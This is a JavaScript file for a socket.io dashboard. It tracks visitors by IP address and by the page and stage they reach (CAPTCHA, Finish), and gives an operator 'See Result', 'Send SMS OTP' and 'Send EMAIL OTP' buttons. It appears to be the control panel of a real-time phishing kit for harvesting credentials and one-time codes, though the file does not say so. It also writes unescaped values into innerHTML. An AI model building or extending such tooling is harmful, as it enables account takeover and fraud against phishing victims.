const socket = io()

document.getElementById('deleteAll').addEventListener('click', function() {
    socket.emit('deleteAll');
});

socket.on('join', (users) => {
    let count = 0
     users.forEach(([ipAddress, details]) => {
          if(details.status == 'actif'){
            count++;
          }
      });
      updateConnectionsTable(users);
      updateActiveUserCount(count); // Update the count of active users
  });

socket.on('leave', (users) => {
    let count = 0
   users.forEach(([ipAddress, details]) => {
        if(details.status == 'actif'){
          count++;
        }
    });
    updateConnectionsTable(users);
    updateActiveUserCount(count); // Update the count of active users
});

function updateConnectionsTable(users){
    const container = document.getElementById('userContainer');

    container.innerHTML = '';

    users.sort(([ip1, details1], [ip2, details2]) => {
        if (details1.status === 'actif' && details2.status !== 'actif') {
            return -1; // 'actif' comes first
        }
        if (details1.status !== 'actif' && details2.status === 'actif') {
            return 1; // 'actif' comes first
        }
        return 0; // No change in order
    });

    users.forEach(([ipAddress, details]) => {
        const userDiv = document.createElement('div');
        userDiv.className = 'col-md-4';

        let color;
        if (details.stage === 'Finish') {
            color = 'warning'; // Set color to warning for users on the finish page
            details.status = 'finish'
        } else {
            color = details.status === 'actif' ? 'success' : 'danger'; // Use success for actif, danger otherwise
        }

        if(details.stage != 'CAPTCHA'){
          userDiv.innerHTML = `
        
          <h5 class="card-title fw-semibold mb-4 badge bg-${color}">${details.status}</h5>
          <div class="card">
            <div class="card-header">
              <span class="badge bg-${color}">
                ${ipAddress}
              </span>
            </div>
            <div class="card-body">
              <h5 class="card-title">${details.page || ''}</h5>
              <p class="card-text">${details.stage || ''}</p>
              <a href="#" class="m-1 btn btn-primary">See Result</a>
              <a href="#" class="m-1 btn btn-warning">Send SMS OTP</a>
              <a href="#" class="m-1 btn btn-warning">Send EMAIL OTP</a>
            </div>
          </div>
    
          `;
        } else {
          userDiv.innerHTML = `
       
          <h5 class="card-title fw-semibold mb-4 badge bg-${color}">${details.status}</h5>
          <div class="card">
            <div class="card-header">
              <span class="badge bg-${color}">
                ${ipAddress}
              </span>
            </div>
            <div class="card-body">
              <h5 class="card-title">${details.page || ''}</h5>
              <p class="card-text">${details.stage || ''}</p>
              <a href="#" class="m-1 btn btn-primary">See Result</a>
            </div>
          </div>
     
          `;
        }

        container.appendChild(userDiv);
    });

}

function updateActiveUserCount(newCount) {
    document.getElementById('activeUserCount').textContent = `Active Users: ${newCount}`;
}